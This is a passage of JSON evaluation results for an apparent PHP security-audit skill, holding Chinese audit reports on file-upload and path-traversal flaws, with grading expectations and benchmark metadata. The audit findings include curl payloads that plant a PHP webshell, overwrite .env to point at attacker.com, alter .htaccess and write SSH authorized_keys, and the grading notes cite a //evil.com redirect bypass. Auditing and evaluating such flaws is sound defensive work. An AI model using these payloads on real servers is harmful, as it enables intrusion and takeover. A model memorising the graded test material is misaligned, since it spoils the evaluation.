\u4e2d\u65e0\u6cd5\u901a\u8fc7\u53c2\u6570\u5316\u67e5\u8be2\u9632\u62a4\uff0c\u9700\u8981\u767d\u540d\u5355", "passed": false, "evidence": "\u4ec5\u8bf4'\u4f7f\u7528\u5b57\u6bb5\u540d\u767d\u540d\u5355'\uff0c\u672a\u89e3\u91ca\u4e3a\u4ec0\u4e48\u53c2\u6570\u5316\u67e5\u8be2\u5bf9 ORDER BY \u65e0\u6548\uff0c\u7f3a\u5c11\u4e0a\u4e0b\u6587\u5206\u6790"}, {"text": "\u62a5\u544a\u5305\u542b\u5177\u4f53\u7684 SQL \u6ce8\u5165\u653b\u51fb payload \u793a\u4f8b", "passed": false, "evidence": "\u62a5\u544a\u4e2d\u65e0\u4efb\u4f55\u653b\u51fb payload \u793a\u4f8b"}, {"text": "\u62a5\u544a\u5bf9\u6bcf\u4e2a\u6f0f\u6d1e\u7ed9\u51fa\u4e86\u5177\u4f53\u7684\u4fee\u590d\u4ee3\u7801\uff08\u4e0d\u4ec5\u662f\u5efa\u8bae\uff09", "passed": false, "evidence": "\u53ea\u6709\u4e00\u53e5\u8bdd\u5efa\u8bae\u5982'\u4f7f\u7528 (int)$_GET['order_id']'\uff0c\u65e0\u5b8c\u6574\u4ee3\u7801\u793a\u4f8b"}], "summary": {"passed": 0, "failed": 4, "total": 4, "pass_rate": 0.0}, "timing": {"executor_duration_seconds": 15.0, "total_duration_seconds": 15.0}}}, {"id": "eval-upload-path-with_skill-run-1", "prompt": "(No prompt found)", "eval_id": null, "outputs": [{"name": "audit-report.md", "type": "text", "content": "# PHP \u6df1\u5ea6\u5b89\u5168\u5ba1\u8ba1\u62a5\u544a \u2014 \u6587\u4ef6\u4e0a\u4f20\u6a21\u5757\n\n## \u653b\u51fb\u9762\u5730\u56fe\n\n| \u5165\u53e3 | \u8def\u7531 | \u9274\u6743 | \u7528\u6237\u53ef\u63a7\u8f93\u5165 | \u5bf9\u5e94 Sink |\n|------|------|------|-------------|-----------|\n| `uploadAvatar()` | `POST /upload/avatar` | \u9700\u767b\u5f55 | `$_FILES['avatar']['type']`, `['name']`, `['tmp_name']` | `move_uploaded_file()` |\n| `exportReport()` | `POST /upload/export` | \u9700\u767b\u5f55 | `$_POST['filename']`, `$_POST['content']` | `file_put_contents()`, `mkdir()` |\n\n---\n\n## \u6f0f\u6d1e 1\uff1a[\u9ad8\u5371] \u8def\u5f84\u7a7f\u8d8a + \u4efb\u610f\u6587\u4ef6\u5199\u5165 \u2014 `exportReport()` \u7684 `filename` \u53c2\u6570\n\n### \u4f20\u64ad\u94fe\u8def\n\n```\nSource:  $_POST['filename']                                  \u2190 UploadController.php:57 (\u8def\u7531: POST /upload/export)\n  \u2193 \u76f4\u63a5\u8d4b\u503c\uff0c\u9ed8\u8ba4 'report.csv' \u4f46\u7528\u6237\u53ef\u8986\u76d6\n$filename = $_POST['filename'] ?? 'report.csv';              \u2190 UploadController.php:57\n  \u2193\nSource:  $_POST['content']                                   \u2190 UploadController.php:58\n  \u2193 \u76f4\u63a5\u8d4b\u503c\n$content = $_POST['content'] ?? '';                          \u2190 UploadController.php:58\n  \u2193 \u4e24\u4e2a\u53c2\u6570\u4e00\u540c\u4f20\u5165 FileService\n$this->fileService->saveExport($filename, $content)           \u2190 UploadController.php:61 (\u8de8\u6587\u4ef6 \u2192 FileService.php)\n  \u2193 \u65b9\u6cd5\u7b7e\u540d\u63a5\u6536\npublic function saveExport($filename, $content)               \u2190 FileService.php:43\n  \u2193 \u76f4\u63a5\u62fc\u63a5 \u2014 \u65e0 basename()\u3001\u65e0 realpath()\u3001\u65e0\u767d\u540d\u5355\n$targetPath = $this->exportDir . $filename;                   \u2190 FileService.php:47\n         = '/var/www/exports/' . $filename\n  \u2193 dirname() \u63d0\u53d6\u76ee\u5f55\u90e8\u5206\n$dir = dirname($targetPath);                                 \u2190 FileService.php:50\n  \u2193 \u76ee\u5f55\u4e0d\u5b58\u5728\u5219\u81ea\u52a8\u521b\u5efa (\u9012\u5f52)\nif (!is_dir($dir)) {\n    mkdir($dir, 0755, true);                                 \u2190 FileService.php:52  [\u8f85\u52a9SINK: mkdir]\n}\n  \u2193 \u5199\u5165\u6587\u4ef6 \u2014 \u8def\u5f84\u548c\u5185\u5bb9\u7686\u7531\u7528\u6237\u63a7\u5236\nfile_put_contents($targetPath, $content);                    \u2190 FileService.php:56  [\u4e3bSINK: file_put_contents]\n```\n\n### \u8fc7\u6ee4\u8bc4\u4f30\n\n| \u8282\u70b9 | \u64cd\u4f5c | \u6709\u6548\u6027 |\n|------|------|--------|\n| UploadController.php:57 | `$_POST['filename'] ?? 'report.csv'` | \u274c \u9ed8\u8ba4\u503c\u4ec5\u5f53\u53c2\u6570\u7f3a\u5931\u65f6\u751f\u6548 |\n| FileService.php:47 | `$this->exportDir . $filename` | \u274c \u65e0 `basename()` \u5265\u79bb\u8def\u5f84 |\n| FileService.php:47 | \u8def\u5f84\u62fc\u63a5 | \u274c \u65e0 `realpath()` \u6821\u9a8c\u6700\u7ec8\u8def\u5f84\u662f\u5426\u5728\u5141\u8bb8\u76ee\u5f55\u5185 |\n| FileService.php:52 | `mkdir($dir, 0755, true)` | \u274c \u9012\u5f52\u521b\u5efa\u76ee\u5f55\uff0c\u53ef\u88ab\u5229\u7528\u521b\u5efa\u4efb\u610f\u76ee\u5f55\u7ed3\u6784 |\n| \u6574\u6761\u94fe\u8def | \u65e0\u4efb\u4f55\u8fc7\u6ee4 | \u274c \u6587\u4ef6\u540d\u3001\u5185\u5bb9\u3001\u8def\u5f84\u5b8c\u5168\u7531\u7528\u6237\u63a7\u5236 |\n\n### \u5229\u7528\u573a\u666f\n\n```bash\n# \u573a\u666f 1\uff1a\u8986\u5199 PHP \u6587\u4ef6 \u2014 \u5199\u5165 webshell\ncurl -X POST /upload/export \\\n  -d \"filename=../../webroot/shell.php\" \\\n  -d \"content=<?php system(\\$_GET['cmd']); ?>\"\n\n# $targetPath = /var/www/exports/../../webroot/shell.php\n#              = /var/www/webroot/shell.php \u2190 \u5199\u5165 webshell\n# \u8bbf\u95ee: http://target.com/shell.php?cmd=whoami\n\n# \u573a\u666f 2\uff1a\u8986\u5199\u914d\u7f6e\u6587\u4ef6 \u2014 \u6cc4\u9732\u51ed\u8bc1\ncurl -X POST /upload/export \\\n  -d \"filename=../../.env\" \\\n  -d \"content=DB_HOST=attacker.com\"\n\n# \u573a\u666f 3\uff1a\u8986\u5199 .htaccess \u2014 \u542f\u7528 PHP \u6267\u884c\ncurl -X POST /upload/export \\\n  -d \"filename=../../../var/www/uploads/.htaccess\" \\\n  -d \"content=AddType application/x-httpd-php .jpg\"\n\n# \u7136\u540e\u4e0a\u4f20\u4e00\u4e2a .jpg \u6587\u4ef6\uff0c\u670d\u52a1\u5668\u5c06\u5176\u4f5c\u4e3a PHP \u6267\u884c\n\n# \u573a\u666f 4\uff1aSSH authorized_keys \u5199\u5165\ncurl -X POST /upload/export \\\n  -d \"filename=../../../root/.ssh/authorized_keys\" \\\n  -d \"content=ssh-rsa AAAAB3...\"\n```\n\n### \u4fee\u590d\u5efa\u8bae\n\n```php\npublic function saveExport($filename, $content)\n{\n    // 1. \u5265\u79bb\u8def\u5f84\uff0c\u53ea\u4fdd\u7559\u6587\u4ef6\u540d\n    $filename = basename($filename);\n\n    // 2. \u767d\u540d\u5355\u6269\u5c55\u540d\n    $allowedExt = ['csv', 'xlsx', 'pdf', 'json'];\n    $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));\n    if (!in_array($ext, $allowedExt, true)) {\n        return false;\n    }\n\n    // 3. \u6dfb\u52a0\u968f\u673a\u524d\u7f00\u9632\u6b62\u6587\u4ef6\u540d\u53ef\u9884\u6d4b\n    $filename = bin2hex(random_bytes(16)) . '_' . $filename;\n    $targetPath = $this->exportDir . $filename;\n\n    // 4. \u9a8c\u8bc1\u6700\u7ec8\u8def\u5f84\u5728\u5141\u8bb8\u76ee\u5f55\u5185\n    $realPath = realpath($this->exportDir);\n    $realTarget = realpath(dirname($targetPath)) . '/' . $filename;\n    if (strpos($realTarget, $realPath) !== 0) {\n        return false;\n    }\n\n    // 5. \u5199\u5165\u6587\u4ef6\n    return file_put_contents($targetPath, $content) !== false;\n}\n```\n\n---\n\n## \u6f0f\u6d1e 2\uff1a[\u4e2d\u5371] \u6587\u4ef6\u4e0a\u4f20\u7ed5\u8fc7 \u2014 `uploadAvatar()` \u591a\u91cd\u6821\u9a8c\u7f3a\u9677\n\n### \u4f20\u64ad\u94fe\u8def\n\n```\nSource:  $_FILES['avatar']                                  \u2190 UploadController.php:33 (\u8def\u7531: POST /upload/avatar)\n  \u2193 \u6574\u4f53\u8d4b\u503c\n$file = $_FILES['avatar'];                                  \u2190 UploadController.php:33\n  \u2193 \u6574\u4f53\u4f20\u5165 FileService\n$this->fileService->processAvatarUpload($file, $userId)      \u2190 UploadController.php:37 (\u8de8\u6587\u4ef6 \u2192 FileService.php)\n  \u2193 \u65b9\u6cd5\u7b7e\u540d\u63a5\u6536 $file \u6570\u7ec4\npublic function processAvatarUpload($file, $userId)           \u2190 FileService.php:13\n\n  \u3010\u6821\u9a8c 1 \u2014 MIME \u7c7b\u578b\u3011:\n  in_array($file['type'], $allowedImageTypes)               \u2190 FileService.php:16\n  $file['type'] \u6765\u81ea\u5ba2\u6237\u7aef Content-Type \u5934 \u2192 \u53ef\u4f2a\u9020\u4e3a 'image/png'\n\n  \u3010\u6821\u9a8c 2 \u2014 \u6269\u5c55\u540d\u3011:\n  $ext = pathinfo($file['name'], PATHINFO_EXTENSION)         \u2190 FileService.php:21\n  $file['name'] \u6765\u81ea\u5ba2\u6237\u7aef\u6587\u4ef6\u540d \u2192 \u53ef\u4f2a\u9020\u4e3a 'shell.jpg'\n\n  \u3010\u6587\u4ef6\u540d\u751f\u6210\u3011:\n  $newFilename = \"avatar_{$userId}.{$ext}\";                  \u2190 FileService.php:28\n  $targetPath = $this->uploadDir . $newFilename;              \u2190 FileService.php:29\n  \u2193\nmove_uploaded_file($file['tmp_name'], $targetPath);          \u2190 FileService.php:32  [SINK]\n```\n\n### \u8fc7\u6ee4\u8bc4\u4f30 \u2014 \u9010\u6821\u9a8c\u5206\u6790\n\n#### \u6821\u9a8c 1\uff1aMIME \u7c7b\u578b\uff08FileService.php:16\uff09\n| \u65b9\u9762 | \u5206\u6790 |\n|------|------|\n| \u68c0\u67e5\u503c | `$file['type']` = \u5ba2\u6237\u7aef `Content-Type` \u5934 |\n| \u53ef\u4f2a\u9020 | \u2705 \u653b\u51fb\u8005\u76f4\u63a5\u7528 Burp \u4fee\u6539 Content-Type \u4e3a `image/png` |\n| \u6709\u6548\u6027 | \u274c **\u5b8c\u5168\u4e0d\u4f9d\u8d56\uff0c\u53ef\u76f4\u63a5\u7ed5\u8fc7** |\n\n#### \u6821\u9a8c 2\uff1a\u6269\u5c55\u540d\uff08FileService.php:21-25\uff09\n| \u65b9\u9762 | \u5206\u6790 |\n|------|------|\n| \u68c0\u67e5\u503c | `pathinfo($file['name'], PATHINFO_EXTENSION)` |\n| \u95ee\u98981 | \u5982\u679c\u6587\u4ef6\u540d\u662f `shell.jpg` \u2192 ext=`jpg` \u2713 \u901a\u8fc7\uff0c\u4f46\u6587\u4ef6\u5185\u5bb9\u53ef\u80fd\u662f PHP |\n| \u95ee\u98982 | \u5982\u679c\u6587\u4ef6\u540d\u662f `shell.php.jpg` \u2192 ext=`jpg` \u2713 \u901a\u8fc7\uff0c\u67d0\u4e9b Apache \u914d\u7f6e\u4f1a\u6267\u884c `.php.jpg` |\n| \u95ee\u98983 | \u6587\u4ef6\u540d\u6765\u81ea\u5ba2\u6237\u7aef `$file['name']`\uff0c\u53ef\u968f\u610f\u4fee\u6539 |\n| \u6709\u6548\u6027 | \u274c **\u4ec5\u68c0\u67e5\u6269\u5c55\u540d\u4e0d\u68c0\u67e5\u5185\u5bb9\uff0c\u53ef\u7ed5\u8fc7** |\n\n#### \u6587\u4ef6\u540d\u751f\u6210\uff08FileService.php:28\uff09\n| \u65b9\u9762 | \u5206\u6790 |\n|------|------|\n| \u683c\u5f0f | `avatar_{userId}.{ext}` |\n| \u53ef\u9884\u6d4b | \u2705 \u5df2\u77e5 userId \u5373\u53ef\u9884\u6d4b\u5b8c\u6574\u6587\u4ef6\u540d |\n| \u65e0\u968f\u673a | \u274c **\u65e0\u968f\u673a\u5316\uff0c\u53ef\u88ab\u679a\u4e3e/\u8986\u76d6** |\n\n### \u5229\u7528\u573a\u666f\n\n```bash\n# \u4e0a\u4f20 PHP webshell \u4f2a\u88c5\u6210 JPEG\ncurl -X POST /upload/avatar \\\n  -F \"avatar=@shell.php;type=image/png;filename=avatar.jpg\"\n\n# $file['type'] = 'image/png' \u2190 \u901a\u8fc7 MIME \u68c0\u67e5\n# $file['name'] = 'avatar.jpg'\u2190 \u901a\u8fc7\u6269\u5c55\u540d\u68c0\u67e5\n# \u6587\u4ef6\u5185\u5bb9 = <?php system($_GET['cmd']); ?> \u2190 \u672a\u88ab\u68c0\u67e5\n# \u4fdd\u5b58\u4e3a /var/www/uploads/avatar_1.jpg\n\n# \u7136\u540e\u914d\u5408\u8def\u5f84\u7a7f\u8d8a\u6f0f\u6d1e\u5199\u5165 .htaccess:\n# AddType application/x-httpd-php .jpg\n# \u2192 \u8bbf\u95ee /uploads/avatar_1.jpg?cmd=whoami \u2192 \u4ee3\u7801\u6267\u884c\uff01\n```\n\n### \u4fee\u590d\u5efa\u8bae\n\n```php\npublic function processAvatarUpload($file, $userId)\n{\n    // 1. \u4f7f\u7528 Fileinfo \u68c0\u6d4b\u771f\u5b9e MIME\uff08\u4e0d\u53ef\u4f9d\u8d56\u5ba2\u6237\u7aef Content-Type\uff09\n    $finfo = new \\finfo(FILEINFO_MIME_TYPE);\n    $realMime = $finfo->file($file['tmp_name']);\n    $allowedMime = ['image/jpeg', 'image/png', 'image/gif'];\n    if (!in_array($realMime, $allowedMime, true)) {\n        return ['success' => false, 'error' => '\u4e0d\u5141\u8bb8\u7684\u6587\u4ef6\u7c7b\u578b'];\n    }\n\n    // 2. \u68c0\u67e5\u771f\u5b9e\u56fe\u50cf\u5c3a\u5bf8\uff08\u786e\u8ba4\u662f\u6709\u6548\u56fe\u50cf\u6587\u4ef6\uff09\n    $imageInfo = getimagesize($file['tmp_name']);\n    if ($imageInfo === false) {\n        return ['success' => false, 'error' => '\u4e0d\u662f\u6709\u6548\u7684\u56fe\u50cf\u6587\u4ef6'];\n    }\n\n    // 3. \u91cd\u65b0\u751f\u6210\u5b89\u5168\u7684\u6269\u5c55\u540d\uff08\u57fa\u4e8e\u771f\u5b9e MIME\uff09\n    $extMap = ['image/jpeg' => 'jpg', 'image/png' => 'png', 'image/gif' => 'gif'];\n    $ext = $extMap[$realMime];\n\n    // 4. \u968f\u673a\u5316\u6587\u4ef6\u540d\n    $newFilename = bin2hex(random_bytes(16)) . '.' . $ext;\n    $targetPath = $this->uploadDir . $newFilename;\n\n    if (move_uploaded_file($file['tmp_name'], $targetPath)) {\n        return ['success' => true, 'url' => \"/uploads/{$newFilename}\"];\n    }\n\n    return ['success' => false, 'error' => '\u6587\u4ef6\u4fdd\u5b58\u5931\u8d25'];\n}\n```\n\n---\n\n## \u5ba1\u8ba1\u7ed3\u8bba\n\n### \u5df2\u5ba1\u8ba1\u5165\u53e3\n\n| \u5165\u53e3 | \u8def\u7531 | \u6f0f\u6d1e | \u98ce\u9669 |\n|------|------|------|------|\n| `exportReport()` | `POST /upload/export` | \u8def\u5f84\u7a7f\u8d8a + \u4efb\u610f\u6587\u4ef6\u5199\u5165 | **\u9ad8** |\n| `uploadAvatar()` | `POST /upload/avatar` | \u6587\u4ef6\u4e0a\u4f20\u6821\u9a8c\u7ed5\u8fc7 (MIME + \u6269\u5c55\u540d) | **\u4e2d** |\n| `uploadAvatar()` | `POST /upload/avatar` | \u6587\u4ef6\u540d\u53ef\u9884\u6d4b + \u65e0\u968f\u673a\u5316 | **\u4f4e** |\n\n### \u98ce\u9669\u6c47\u603b\n\n| \u7b49\u7ea7 | \u6570\u91cf | \u8be6\u60c5 |\n|------|------|------|\n| \u9ad8 | 1 | \u8def\u5f84\u7a7f\u8d8a \u2014 `filename` \u53ef\u8986\u5199\u4efb\u610f\u6587\u4ef6 |\n| \u4e2d | 1 | \u6587\u4ef6\u4e0a\u4f20\u7ed5\u8fc7 \u2014 MIME/\u6269\u5c55\u540d\u6821\u9a8c\u53ef\u4f2a\u9020 |\n| \u4f4e | 1 | \u6587\u4ef6\u540d\u53ef\u9884\u6d4b |\n| **\u5408\u8ba1** | **3** | |\n\n### \u4fee\u590d\u4f18\u5148\u7ea7\n\n1. **P0\uff08\u7acb\u5373\u4fee\u590d\uff09\uff1a** `saveExport()` \u7684\u8def\u5f84\u7a7f\u8d8a \u2014 \u6dfb\u52a0 `basename()` + \u767d\u540d\u5355 + `realpath()` \u6821\u9a8c\n2. **P1\uff0824\u5c0f\u65f6\u5185\uff09\uff1a** `uploadAvatar()` \u7684\u6587\u4ef6\u4e0a\u4f20\u6821\u9a8c \u2014 \u7528 `finfo` \u68c0\u6d4b\u771f\u5b9e MIME + `getimagesize()` \u9a8c\u8bc1\n3. **P2\uff08\u672c\u5468\u5185\uff09\uff1a** \u4e0a\u4f20\u6587\u4ef6\u540d\u968f\u673a\u5316\n\n### \u5b89\u5168\u52a0\u56fa\u5efa\u8bae\n\n- \u6240\u6709\u6587\u4ef6\u8def\u5f84\u64cd\u4f5c\u7edf\u4e00\u4f7f\u7528 `basename()` \u5265\u79bb\u76ee\u5f55\u7a7f\u8d8a\u5b57\u7b26\n- \u4e0a\u4f20\u6587\u4ef6\u5185\u5bb9\u5fc5\u987b\u7528 `finfo` \u6216 `getimagesize()` \u9a8c\u8bc1\u771f\u5b9e\u7c7b\u578b\uff0c\u4e0d\u4fe1\u4efb\u5ba2\u6237\u7aef\u63d0\u4f9b\u7684\u4efb\u4f55\u5143\u6570\u636e\n- \u4e0a\u4f20\u76ee\u5f55\u914d\u7f6e `.htaccess` \u7981\u6b62\u811a\u672c\u6267\u884c\uff1a`php_flag engine off`\n- \u6587\u4ef6\u540d\u4f7f\u7528\u968f\u673a\u5b57\u7b26\u4e32\uff08`bin2hex(random_bytes(16))`\uff09\uff0c\u907f\u514d\u53ef\u9884\u6d4b\u6027\n- \u5bfc\u51fa\u529f\u80fd\u7684\u8def\u5f84\u4f7f\u7528 `realpath()` \u6821\u9a8c\u6700\u7ec8\u8def\u5f84\u5728\u5141\u8bb8\u76ee\u5f55\u5185\n"}], "grading": {"expectations": [{"text": "\u62a5\u544a\u5305\u542b filename \u4ece $_POST \u5230 file_put_contents \u7684\u5b8c\u6574 Source-to-Sink \u4f20\u64ad\u94fe\u8def", "passed": true, "evidence": "\u4f20\u64ad\u94fe\u8def\u5b8c\u6574\u5217\u51fa: $_POST['filename'] \u2192 UploadController.php:57 \u2192 UploadController.php:61 (\u8de8\u6587\u4ef6) \u2192 FileService.php:43 \u2192 FileService.php:47 ($exportDir\u62fc\u63a5) \u2192 FileService.php:50 (dirname) \u2192 FileService.php:52 (mkdir) \u2192 FileService.php:56 (file_put_contents)\uff0c\u6bcf\u6b65\u6807\u6ce8\u6587\u4ef6:\u884c\u53f7"}, {"text": "\u62a5\u544a\u6307\u51fa MIME \u7c7b\u578b\u68c0\u67e5\u4ec5\u4f9d\u8d56\u5ba2\u6237\u7aef $file['type']\uff08\u53ef\u4f2a\u9020\uff09", "passed": true, "evidence": "\u660e\u786e\u5199\u6709'$file['type'] = \u5ba2\u6237\u7aef Content-Type \u5934 \u2192 \u53ef\u4f2a\u9020'\uff0c\u5e76\u8bf4\u660e'\u653b\u51fb\u8005\u76f4\u63a5\u7528 Burp \u4fee\u6539 Content-Type \u4e3a image/png'"}, {"text": "\u62a5\u544a\u5305\u542b\u8def\u5f84\u7a7f\u8d8a\u7684\u5177\u4f53\u5229\u7528 payload\uff08\u5982 ../../config/database.php\uff09", "passed": true, "evidence": "\u5229\u7528\u573a\u666f\u5305\u542b4\u4e2a\u5177\u4f53 payload: ../../webroot/shell.php\uff08\u5199webshell\uff09\u3001../../.env\uff08\u8986\u5199\u914d\u7f6e\uff09\u3001../.htaccess\uff08\u542f\u7528PHP\u6267\u884c\uff09\u3001../../../root/.ssh/authorized_keys\uff08SSH\u5199\u5165\uff09"}, {"text": "\u62a5\u544a\u5bf9\u6bcf\u4e2a\u6f0f\u6d1e\u7ed9\u51fa\u4e86\u5b8c\u6574\u7684\u4fee\u590d\u4ee3\u7801\u793a\u4f8b", "passed": true, "evidence": "\u6bcf\u4e2a\u6f0f\u6d1e\u90fd\u6709\u5b8c\u6574\u4fee\u590d\u4ee3\u7801: basename() + bin2hex\u968f\u673a\u5316 + realpath()\u6821\u9a8c\u7684\u5b8c\u6574\u65b9\u6cd5\u3001finfo\u68c0\u6d4b\u771f\u5b9eMIME + getimagesize()\u9a8c\u8bc1 + \u968f\u673a\u5316\u6587\u4ef6\u540d\u7684\u5b8c\u6574\u65b9\u6cd5"}], "summary": {"passed": 4, "failed": 0, "total": 4, "pass_rate": 1.0}, "timing": {"executor_duration_seconds": 42.0, "total_duration_seconds": 42.0}}}, {"id": "eval-upload-path-without_skill-run-1", "prompt": "(No prompt found)", "eval_id": null, "outputs": [{"name": "audit-report.md", "type": "text", "content": "# \u6587\u4ef6\u4e0a\u4f20\u6a21\u5757\u5b89\u5168\u5ba1\u8ba1\u62a5\u544a\n\n\u5ba1\u8ba1\u6587\u4ef6\uff1a\n- Controller/UploadController.php\n- Service/FileService.php\n\n## \u53d1\u73b0\u7684\u95ee\u9898\n\n### 1. \u8def\u5f84\u7a7f\u8d8a (FileService.php:47-56)\n\n`saveExport()` \u4e2d `$filename` \u76f4\u63a5\u62fc\u63a5\u5230\u8def\u5f84\u4e2d\uff0c\u672a\u505a `basename()` \u8fc7\u6ee4\u3002\u653b\u51fb\u8005\u53ef\u4f20\u5165 `../../config/database.php` \u8986\u5199\u4efb\u610f\u6587\u4ef6\u3002\n\n\u4fee\u590d\uff1a\u4f7f\u7528 `basename($filename)` \u5265\u79bb\u8def\u5f84\u3002\n\n### 2. \u6587\u4ef6\u4e0a\u4f20\u7ed5\u8fc7 (FileService.php:16-32)\n\n`uploadAvatar()` \u4e2d\u6821\u9a8c\u5b58\u5728\u591a\u4e2a\u7f3a\u9677\uff1a\n- MIME \u7c7b\u578b\u4ec5\u68c0\u67e5 `$file['type']`\uff08\u5ba2\u6237\u7aef\u53ef\u63a7\uff0c\u53ef\u4f2a\u9020\uff09\n- \u6269\u5c55\u540d\u4ec5\u68c0\u67e5\u539f\u59cb\u6587\u4ef6\u540d\uff0c\u4e0d\u68c0\u67e5\u6587\u4ef6\u5185\u5bb9\n- \u6587\u4ef6\u540d\u53ef\u9884\u6d4b\n\n\u4fee\u590d\uff1a\u4f7f\u7528 `finfo` \u68c0\u6d4b\u771f\u5b9e MIME \u7c7b\u578b\uff0c\u6587\u4ef6\u540d\u52a0\u968f\u673a\u524d\u7f00\u3002\n\n### 3. \u76ee\u5f55\u521b\u5efa (FileService.php:52)\n\n`mkdir($dir, 0755, true)` \u9012\u5f52\u521b\u5efa\u76ee\u5f55\uff0c\u53ef\u80fd\u88ab\u8def\u5f84\u7a7f\u8d8a\u5229\u7528\u3002\n\n## \u603b\u7ed3\n\n\u5171\u53d1\u73b0 2 \u4e2a\u4e3b\u8981\u95ee\u9898\uff1a1 \u4e2a\u9ad8\u5371\uff08\u8def\u5f84\u7a7f\u8d8a\uff09\uff0c1 \u4e2a\u4e2d\u5371\uff08\u4e0a\u4f20\u7ed5\u8fc7\uff09\u3002\n"}], "grading": {"expectations": [{"text": "\u62a5\u544a\u5305\u542b filename \u4ece $_POST \u5230 file_put_contents \u7684\u5b8c\u6574 Source-to-Sink \u4f20\u64ad\u94fe\u8def", "passed": false, "evidence": "\u4ec5\u8bf4'$filename \u76f4\u63a5\u62fc\u63a5\u5230\u8def\u5f84\u4e2d'\uff0c\u65e0\u9010\u884c\u8ffd\u8e2a\uff0c\u65e0\u4e2d\u95f4\u8282\u70b9\u5206\u6790\uff0c\u65e0\u8de8\u6587\u4ef6\u4f20\u9012\u8bb0\u5f55"}, {"text": "\u62a5\u544a\u6307\u51fa MIME \u7c7b\u578b\u68c0\u67e5\u4ec5\u4f9d\u8d56\u5ba2\u6237\u7aef $file['type']\uff08\u53ef\u4f2a\u9020\uff09", "passed": false, "evidence": "\u4ec5\u8bf4'MIME \u7c7b\u578b\u4ec5\u68c0\u67e5 $file[\"type\"]\uff08\u5ba2\u6237\u7aef\u53ef\u63a7\uff0c\u53ef\u4f2a\u9020\uff09'\uff0c\u672a\u89e3\u91ca $file['type'] \u4e3a\u4ec0\u4e48\u6765\u81ea\u5ba2\u6237\u7aef\u3001\u5982\u4f55\u4f2a\u9020"}, {"text": "\u62a5\u544a\u5305\u542b\u8def\u5f84\u7a7f\u8d8a\u7684\u5177\u4f53\u5229\u7528 payload\uff08\u5982 ../../config/database.php\uff09", "passed": false, "evidence": "\u4ec5\u63d0\u5230'../../config/database.php'\u4f5c\u4e3a\u793a\u4f8b\uff0c\u65e0\u5b8c\u6574\u7684\u5229\u7528\u573a\u666f\u8bf4\u660e"}, {"text": "\u62a5\u544a\u5bf9\u6bcf\u4e2a\u6f0f\u6d1e\u7ed9\u51fa\u4e86\u5b8c\u6574\u7684\u4fee\u590d\u4ee3\u7801\u793a\u4f8b", "passed": false, "evidence": "\u4ec5\u6709\u4e00\u53e5\u8bdd\u5efa\u8bae\u5982'\u4f7f\u7528 basename($filename)'\u6216'\u4f7f\u7528 finfo \u68c0\u6d4b\u771f\u5b9e MIME \u7c7b\u578b'\uff0c\u65e0\u5b8c\u6574\u4ee3\u7801"}], "summary": {"passed": 0, "failed": 4, "total": 4, "pass_rate": 0.0}, "timing": {"executor_duration_seconds": 12.0, "total_duration_seconds": 12.0}}}], "previous_feedback": {}, "previous_outputs": {}, "benchmark": {"metadata": {"skill_name": "php-deep-audit", "skill_path": "<path/to/skill>", "executor_model": "<model-name>", "analyzer_model": "<model-name>", "timestamp": "2026-06-17T08:47:43Z", "evals_run": [1, 2, 3], "runs_per_configuration": 3}, "runs": [{"eval_id": 2, "configuration": "with_skill", "run_number": 1, "result": {"pass_rate": 1.0, "passed": 3, "failed": 0, "total": 3, "time_seconds": 40.0, "tokens": 0, "tool_calls": 0, "errors": 0}, "expectations": [{"text": "\u62a5\u544a\u89e3\u91ca\u4e86 addslashes + GBK \u5bbd\u5b57\u8282\u6ce8\u5165\u7684\u539f\u7406\uff08\u542b %df%5c \u5b57\u8282\u5e8f\u5217\u5206\u6790\uff09", "passed": true, "evidence": "\u5305\u542b\u8be6\u7ec6\u7684\u5bbd\u5b57\u8282\u6ce8\u5165\u539f\u7406\u8bf4\u660e\uff1a\u539f\u59cb\u5b57\u8282 0xDF 0x27 \u2192 addslashes\u540e 0xDF 0x5C 0x27 \u2192 GBK\u89e3\u7801 0xDF5C(\u904b) 0x27(')\uff0c\u5b8c\u6574\u89e3\u91ca\u4e86\u8f6c\u4e49\u7b26\u88ab'\u5403\u6389'\u7684\u8fc7\u7a0b"}, {"text": "\u62a5\u544a\u6307\u51fa buildRedirectUrl \u4e2d // \u534f\u8bae\u76f8\u5bf9 URL \u53ef\u7ed5\u8fc7 strpos(http://) \u68c0\u67e5", "passed": true, "evidence": "\u660e\u786e\u5199\u51fa'//evil.com \u4e0d\u542b http://\uff0c\u5b8c\u5168\u7ed5\u8fc7'\uff0c\u5e76\u8bf4\u660e\u4e86\u534f\u8bae\u76f8\u5bf9 URL \u7684\u6d4f\u89c8\u5668\u884c\u4e3a"}, {"text": "\u62a5\u544a\u6307\u51fa ssoVerify \u4e2d token/state \u672a URL \u7f16\u7801\u5bfc\u81f4\u67e5\u8be2\u53c2\u6570\u6ce8\u5165", "passed": true, "evidence": "\u6307\u51fa'\u76f4\u63a5\u62fc\u63a5\u5230 URL \u67e5\u8be2\u5b57\u7b26\u4e32\uff08\u672a urlencode\uff09'\uff0c\u7ed9\u51fa\u4e86\u53c2\u6570\u6ce8\u5165\u7684\u5177\u4f53\u573a\u666f\u5982 redirect_uri \u6ce8\u5165"}], "notes": []}, {"eval_id": 1, "configuration": "with_skill", "run_number": 1, "result": {"pass_rate": 1.0, "passed": 4, "failed": 0, "total": 4, "time_seconds": 45.0, "tokens": 0, "tool_calls": 0, "errors": 0}, "expectations": [{"text": "\u62a5\u544a\u5305\u542b $_GET['order_id'] \u4ece Controller \u7ecf Service \u5230 Repository \u7684\u5b8c\u6574\u8de8\u6587\u4ef6\u4f20\u64ad\u94fe\u8def", "passed": true, "evidence": "\u4f20\u64ad\u94fe\u8def\u90e8\u5206\u5b8c\u6574\u5217\u51fa\u4e86: Source \u2192 OrderController.php:32 \u2192 OrderController.php:41 (\u8de8\u6587\u4ef6) \u2192 OrderService.php:18 \u2192 OrderService.php:22 (\u8de8\u6587\u4ef6) \u2192 OrderRepository.php:17 \u2192 OrderRepository.php:21 \u2192 OrderRepository.php:22 [SINK]\uff0c\u6bcf\u4e2a\u8282\u70b9\u6807\u6ce8\u4e86\u6587\u4ef6\u540d\u548c\u884c\u53f7"}, {"text": "\u62a5\u544a\u660e\u786e\u6307\u51fa $sortField \u5728 ORDER BY \u4e2d\u65e0\u6cd5\u901a\u8fc7\u53c2\u6570\u5316\u67e5\u8be2\u9632\u62a4\uff0c\u9700\u8981\u767d\u540d\u5355", "passed": true, "evidence": "\u5173\u952e\u5206\u6790\u660e\u786e\u5199\u9053\uff1a'ORDER BY / GROUP BY 